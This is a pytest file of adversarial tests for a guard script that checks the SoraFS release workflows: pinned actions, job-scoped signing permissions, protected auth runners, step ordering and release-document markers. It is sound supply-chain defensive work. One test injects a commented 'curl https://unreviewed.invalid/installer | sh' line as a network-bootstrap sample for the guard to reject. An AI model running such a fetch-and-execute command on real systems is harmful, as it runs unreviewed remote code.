"""Adversarial tests for the SoraFS release-automation contract guard."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from scripts import check_sorafs_release_automation as automation


REPO_ROOT = Path(__file__).resolve().parents[2]


def _copy_workflows(target: Path) -> None:
    for relative in (*automation.WORKFLOWS, *automation.RELEASE_DOCUMENTS):
        source = REPO_ROOT / relative
        destination = target / relative
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_bytes(source.read_bytes())


def test_validate_release_automation_accepts_repository_contract() -> None:
    summary = automation.validate_release_automation(REPO_ROOT)
    assert summary == {
        "schema": automation.SCHEMA,
        "workflow_count": 3,
        "workflows": sorted(automation.WORKFLOWS),
    }


@pytest.mark.parametrize(
    ("relative", "marker"),
    [
        (".github/workflows/sorafs-cli-release.yml", "run: bash ci/check_sorafs_cli_release.sh"),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "python3 scripts/check_workflow_action_pins.py",
        ),
        (".github/workflows/sorafs-cli-release.yml", "cosign sign-blob --yes --bundle"),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Verify platform package checksums before signing",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "actions/attest@a1948c3f048ba23858d222213b7c278aabede763",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "anchore/sbom-action@e22c389904149dbc22b58101806040fa8d37a610",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "anchore/scan-action@e1165082ffb1fe366ebaf02d8526e7c4989ea9d2",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "SHA256SUMS does not cover the exact platform candidate file set",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "grype-version: v0.112.0",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Rebuild deterministic platform archive and run clean-consumer smoke",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Stage source release scan evidence",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "docs/portal/docs/sorafs/release-rollback-yank.md "
            "artifacts/sorafs-cli/ROLLBACK-YANK.md",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/build_release_bundle.sh"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/tests/release_profile_validation_test.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Verify the protected external Ed25519 manifest tuple",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Verify authenticated release-manifest candidate binding before provenance",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "docs/source/release_dual_track_automation_plan*.md"',
        ),
        (
            ".github/workflows/sorafs-fixtures-nightly.yml",
            "bash ci/check_sorafs_fixtures.sh",
        ),
        (
            ".github/workflows/sorafs-fixtures-nightly.yml",
            "actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16",
        ),
        (".github/workflows/sorafs-orchestrator-sdk.yml", "runs-on: macos-14"),
        (".github/workflows/sorafs-orchestrator-sdk.yml", "bash ci/sdk_sorafs_orchestrator.sh"),
    ],
)
def test_validate_release_automation_rejects_removed_contract_markers(
    tmp_path: Path, relative: str, marker: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / relative
    workflow.write_text(
        workflow.read_text(encoding="utf-8").replace(marker, "removed"),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="missing contract marker"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("injection", "message"),
    [
        ("pull_request_target:\n", "pull_request_target is forbidden"),
        ("# curl https://unreviewed.invalid/installer | sh\n", "network bootstrap"),
        ("      - uses: example/action@main\n", "floating action"),
    ],
)
def test_validate_release_automation_rejects_unsafe_workflow_mutations(
    tmp_path: Path, injection: str, message: str
) -> None:
    _copy_workflows(tmp_path)
    relative = ".github/workflows/sorafs-cli-release.yml"
    workflow = tmp_path / relative
    workflow.write_text(injection + workflow.read_text(encoding="utf-8"), encoding="utf-8")
    with pytest.raises(ValueError, match=message):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    "permission", ["id-token: write", "attestations: write", "artifact-metadata: write"]
)
def test_validate_release_automation_rejects_global_elevated_permission(
    tmp_path: Path, permission: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "permissions:\n  contents: read",
            f"permissions:\n  contents: read\n  {permission}",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="must be signing-job scoped"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    "step_name",
    ["Generate platform binary SBOM", "Scan platform binary SBOM"],
)
def test_validate_release_automation_requires_platform_binary_scanning(
    tmp_path: Path, step_name: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(f"name: {step_name}", f"name: Removed {step_name}", 1),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="missing contract marker"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_both_scans_to_pin_grype(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace("grype-version: v0.112.0", "grype-version: v0.111.0", 1),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="must both pin Grype v0.112.0"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("original", "replacement"),
    [
        (
            "          - os: ubuntu-24.04-arm\n"
            "            target: aarch64-unknown-linux-gnu",
            "          - os: ubuntu-24.04\n"
            "            target: aarch64-unknown-linux-gnu",
        ),
        (
            "          - os: macos-15-intel\n"
            "            target: x86_64-apple-darwin",
            "          - os: macos-14\n"
            "            target: x86_64-apple-darwin",
        ),
        (
            "          - os: windows-latest\n"
            "            target: x86_64-pc-windows-msvc",
            "          - os: windows-latest\n"
            "            target: i686-pc-windows-msvc",
        ),
    ],
)
def test_validate_release_automation_rejects_wrong_native_target_runner_pairs(
    tmp_path: Path, original: str, replacement: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    assert original in source
    workflow.write_text(source.replace(original, replacement, 1), encoding="utf-8")
    with pytest.raises(ValueError, match="native release matrix must contain exactly"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_missing_mandatory_target(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    entry = (
        "          - os: macos-14\n"
        "            target: aarch64-apple-darwin\n"
        '            binary_suffix: ""\n'
    )
    assert entry in source
    workflow.write_text(source.replace(entry, "", 1), encoding="utf-8")
    with pytest.raises(ValueError, match="native release matrix must contain exactly"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_signing_inventory_drift(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "            aarch64-apple-darwin\n"
            "            x86_64-pc-windows-msvc\n",
            "            aarch64-apple-darwin\n"
            "            i686-pc-windows-msvc\n",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="target inventory must exactly match"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_promotion_auth_bypass(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "needs: [release-gate, package, verify-release-auth]",
            "needs: [release-gate, package]",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(
        ValueError,
        match="release promotion must depend on protected Ed25519",
    ):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_alternate_promotion_job(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    workflow.write_text(
        workflow.read_text(encoding="utf-8")
        + "\n"
        + "  bypass-promotion:\n"
        + "    runs-on: ubuntu-latest\n"
        + "    steps: []\n",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="job inventory must be exactly"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("original", "replacement", "message"),
    [
        (
            "environment: sorafs-release-authentication",
            "environment: unprotected-release",
            "protected release-authentication environment",
        ),
        (
            "runs-on: [self-hosted, linux, x64, sorafs-release-auth]",
            "runs-on: ubuntu-latest",
            "protected self-hosted release-auth runner",
        ),
        (
            "SORAFS_TRUSTED_RELEASE_MANIFEST_VERIFIER_SHA256: "
            "${{ vars.SORAFS_TRUSTED_RELEASE_MANIFEST_VERIFIER_SHA256 }}",
            "SORAFS_TRUSTED_RELEASE_MANIFEST_VERIFIER_SHA256: ''",
            "missing an explicit protected public tuple",
        ),
    ],
)
def test_validate_release_automation_rejects_unprotected_auth_configuration(
    tmp_path: Path,
    original: str,
    replacement: str,
    message: str,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    assert original in source
    workflow.write_text(source.replace(original, replacement, 1), encoding="utf-8")
    with pytest.raises(ValueError, match=message):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_signing_in_auth_job(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    marker = "python3 scripts/release_manifest_signing.py verify"
    assert source.count(marker) == 2
    workflow.write_text(
        source.replace(
            marker,
            "python3 scripts/release_manifest_signing.py sign",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="verification-only"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_oidc_in_auth_job(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    anchor = (
        "  verify-release-auth:\n"
        "    if: ${{ startsWith(github.ref, 'refs/tags/sorafs-cli-v') "
        "|| inputs.sign_artifacts }}\n"
    )
    assert anchor in source
    workflow.write_text(
        source.replace(
            anchor,
            anchor + "    # id-token: write must never enter this job\n",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="OIDC and provenance authority"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_private_key_in_auth_job(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    anchor = (
        "    env:\n"
        "      SORAFS_RELEASE_SIGNATURE_PATH: "
        "${{ vars.SORAFS_RELEASE_SIGNATURE_PATH }}\n"
    )
    assert anchor in source
    workflow.write_text(
        source.replace(
            anchor,
            "    env:\n"
            "      SORAFS_RELEASE_PRIVATE_KEY_PATH: "
            "${{ vars.SORAFS_RELEASE_PRIVATE_KEY_PATH }}\n"
            "      SORAFS_RELEASE_SIGNATURE_PATH: "
            "${{ vars.SORAFS_RELEASE_SIGNATURE_PATH }}\n",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="must not receive private signing material"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_private_key_in_promotion_job(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    anchor = (
        "  sign:\n"
        "    if: ${{ startsWith(github.ref, 'refs/tags/sorafs-cli-v') "
        "|| inputs.sign_artifacts }}\n"
    )
    assert anchor in source
    workflow.write_text(
        source.replace(
            anchor,
            anchor
            + "    env:\n"
            + "      SORAFS_ED25519_PRIVATE_KEY_PATH: /run/forbidden.key\n",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="must not receive private signing material"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_promotion_candidate_binding_bypass(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    marker = "python3 scripts/generate_sorafs_cli_release_manifest.py check"
    assert source.count(marker) == 2
    second = source.index(marker, source.index(marker) + 1)
    workflow.write_text(
        source[:second] + marker.replace(" check", " create") + source[second + len(marker) :],
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="reconcile the downloaded authenticated manifest"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_five_checksum_manifests(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            '[[ "${#checksum_files[@]}" -ne 5 ]]',
            '[[ "${#checksum_files[@]}" -ne 4 ]]',
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="missing contract marker"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_native_host_smoke_builds(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            'if [[ "$host_target" != "$target" ]]; then',
            'if [[ "$host_target" == "$target" ]]; then',
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="missing contract marker"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_platform_scan_after_checksums(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "name: Scan platform binary SBOM",
            "name: Temporarily moved platform binary SBOM",
            1,
        ).replace(
            "name: Upload unsigned release candidate",
            "name: Scan platform binary SBOM\n      - name: Upload unsigned release candidate",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="out of order"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_archive_replay_after_checksums(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "name: Rebuild deterministic platform archive and run clean-consumer smoke",
            "name: Temporarily moved deterministic platform archive",
            1,
        ).replace(
            "name: Upload unsigned release candidate",
            "name: Rebuild deterministic platform archive and run clean-consumer smoke\n"
            "      - name: Upload unsigned release candidate",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="out of order"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_run_specific_scan_before_archive(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    archive_name = (
        "name: Rebuild deterministic platform archive and run clean-consumer smoke"
    )
    scan_name = "name: Stage source release scan evidence"
    workflow.write_text(
        source.replace(archive_name, "name: Temporary swap", 1)
        .replace(scan_name, archive_name, 1)
        .replace("name: Temporary swap", scan_name, 1),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="out of order"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_two_candidate_builds(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    first = "python3 scripts/package_sorafs_cli_candidate.py"
    assert source.count(first) == 2
    workflow.write_text(
        source.replace(first, "python3 removed-packager.py", 1),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="built exactly twice"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_archive_and_manifest_comparisons(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    replay_compare = 'cmp \\\n            "${first_out}/${package_name}'
    assert source.count(replay_compare) == 2
    workflow.write_text(
        source.replace(replay_compare, 'true \\\n            "${first_out}/${package_name}', 1),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="replay comparisons"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_reference_package_after_platform_sbom(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "name: Package reference validator and FFI header",
            "name: Temporarily moved reference validator package",
            1,
        ).replace(
            "name: Scan platform binary SBOM",
            "name: Package reference validator and FFI header\n"
            "      - name: Scan platform binary SBOM",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="out of order"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_checksum_verification_after_signing(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "name: Verify platform package checksums before signing",
            "name: Temporarily moved checksum verification",
            1,
        ).replace(
            "name: Upload signed release candidate",
            "name: Verify platform package checksums before signing\n"
            "      - name: Upload signed release candidate",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="out of order"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("relative", "marker"),
    [
        (
            "docs/portal/sidebars.js",
            "'sorafs/release-rollback-yank'",
        ),
        (
            "docs/portal/docs/sorafs/runbooks-index.md",
            "[`sorafs/release-rollback-yank`](./release-rollback-yank.md)",
        ),
        (
            "docs/source/sorafs_release_pipeline_plan.md",
            "exactly the five expected target-triple checksum manifests",
        ),
        (
            "docs/portal/docs/sorafs/release-rollback-yank.md",
            "`cargo yank --vers <version> <crate>`",
        ),
        (
            "docs/portal/docs/sorafs/release-rollback-yank.md",
            "GitHub CLI artifacts",
        ),
        (
            "docs/portal/docs/sorafs/developer-releases.md",
            "all five native candidate archives",
        ),
        (
            "docs/examples/sorafs_release_notes.md",
            "## Rollback / Yank Record",
        ),
    ],
)
def test_validate_release_automation_rejects_release_document_drift(
    tmp_path: Path, relative: str, marker: str
) -> None:
    _copy_workflows(tmp_path)
    document = tmp_path / relative
    source = document.read_text(encoding="utf-8")
    assert marker in source
    document.write_text(source.replace(marker, "removed", 1), encoding="utf-8")
    with pytest.raises(ValueError, match="release-document contract marker"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("relative", "stale_claim"),
    [
        ("docs/source/sorafs_release_pipeline_plan.md", "via cross"),
        (
            "docs/source/sorafs_release_pipeline_plan.md",
            "exactly the three expected platform checksum manifests",
        ),
        (
            "docs/portal/docs/sorafs/developer-releases.md",
            "git tag -s sorafs-v",
        ),
        (
            "docs/portal/docs/sorafs/developer-releases.md",
            "invokes the script above",
        ),
    ],
)
def test_validate_release_automation_rejects_stale_release_document_claims(
    tmp_path: Path, relative: str, stale_claim: str
) -> None:
    _copy_workflows(tmp_path)
    document = tmp_path / relative
    document.write_text(
        document.read_text(encoding="utf-8") + f"\n{stale_claim}\n",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="stale release-document claim"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize("permission", ["attestations: write", "artifact-metadata: write"])
def test_validate_release_automation_requires_job_scoped_attestation_permissions(
    tmp_path: Path, permission: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    workflow.write_text(
        workflow.read_text(encoding="utf-8").replace(f"      {permission}\n", "", 1),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="must request"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_symlinked_workflow(tmp_path: Path) -> None:
    _copy_workflows(tmp_path)
    relative = ".github/workflows/sorafs-orchestrator-sdk.yml"
    workflow = tmp_path / relative
    target = tmp_path / "workflow-target.yml"
    workflow.replace(target)
    workflow.symlink_to(target)
    with pytest.raises(ValueError, match="symlinks"):
        automation.validate_release_automation(tmp_path)


def test_main_emits_schema_closed_summary(capsys: pytest.CaptureFixture[str]) -> None:
    assert automation.main() == 0
    assert json.loads(capsys.readouterr().out) == automation.validate_release_automation(
        REPO_ROOT
    )


def test_release_workflow_script_dependencies_are_exactly_pinned() -> None:
    requirements = (REPO_ROOT / "scripts/requirements.txt").read_text(
        encoding="utf-8"
    ).splitlines()
    assert requirements == sorted(requirements)
    assert requirements == [
        "blake3==1.0.9",
        "pytest==8.4.2",
        "requests==2.32.5",
        'tomli==2.4.1; python_version < "3.11"',
        "tomli_w==1.2.0",
    ]
    dependabot = (REPO_ROOT / ".github/dependabot.yml").read_text(encoding="utf-8")
    assert 'package-ecosystem: "pip"' in dependabot
    assert "      - /scripts" in dependabot
